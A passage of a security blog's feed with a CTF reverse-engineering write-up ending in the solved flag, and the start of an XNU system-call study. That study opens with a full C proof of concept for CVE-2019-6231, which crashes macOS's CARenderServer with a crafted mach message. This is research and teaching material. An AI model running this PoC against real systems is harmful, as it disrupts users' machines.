tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" 